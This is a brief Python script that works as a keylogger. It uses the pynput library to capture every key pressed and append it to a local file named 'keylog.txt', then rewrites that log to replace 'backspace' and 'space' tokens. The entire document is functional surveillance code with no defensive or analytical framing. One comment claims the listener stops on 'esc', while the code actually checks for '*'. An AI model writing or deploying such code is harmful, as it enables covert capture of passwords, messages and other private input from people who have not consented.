from pynput import keyboard

log_file = "keylog.txt"

def on_press(key):
    try:
        # Get the key's name or character
        key_name = key.char
    except AttributeError:
        # If the key doesn't have a character, get its name instead
        key_name = key.name

    # Log the key to the file
    with open(log_file, "a") as file:
        file.write(key_name+" ")

    # Stop the listener if the "esc" key is pressed
    if key_name == "*":
        return False

# Start the key listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

def replace_word_in_file(file_path, old_word, new_word):
    with open(file_path, 'r') as file:
        content = file.read()

    modified_content = content.replace(old_word, new_word)

    with open(file_path, 'w') as file:
        file.write(modified_content)

# Example usage
file_path = 'keylog.txt'
old_word = 'backspace'
new_word = '...'
replace_word_in_file(file_path, old_word, new_word)

old_word = 'space'
new_word = '_'

replace_word_in_file(file_path, old_word, new_word)

